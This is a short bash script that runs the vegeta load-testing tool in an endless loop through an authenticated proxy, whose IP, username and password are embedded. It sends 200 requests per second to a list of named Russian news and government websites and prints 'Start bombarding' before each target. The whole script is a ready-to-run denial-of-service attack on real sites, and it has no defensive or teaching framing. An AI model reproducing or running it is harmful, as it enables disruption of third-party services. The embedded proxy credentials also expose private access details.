PHOST=109.172.5.208
PPORT=45785
PUSER=Seltejfaturen
PPSWD=C6o9LlF
LOAD_TIME=60s
LOAD_RATE='200/s'

HTTP_PROXY="http://$PUSER:$PPSWD@$PHOST:$PPORT"
HTTPS_PROXY="http://$PUSER:$PPSWD@$PHOST:$PPORT"

DESTINATIONS=(
https://lenta.ru/
https://ria.ru/
https://www.rt.com/
http://kremlin.ru/
https://www.gosuslugi.ru/
http://www.fsb.ru
http://www.gov.ru/main/page3.html
http://putin.kremlin.ru

)
i=0
while true
do
  let "i=i+1"
  echo
  echo Iteration starts: $i
  echo
  for dst in "${DESTINATIONS[@]}"
  do
    echo "Start bombarding ${dst}. Iteration $i"
    docker run --rm -it -e HTTP_PROXY="$HTTP_PROXY" \
    -e HTTPS_PROXY="$HTTPS_PROXY" \
    peterevans/vegeta \
    sh -c "echo 'GET $dst' |\
      vegeta attack -duration=$LOAD_TIME -redirects=3 -rate=$LOAD_RATE |\
       vegeta report --type=text"
  done
done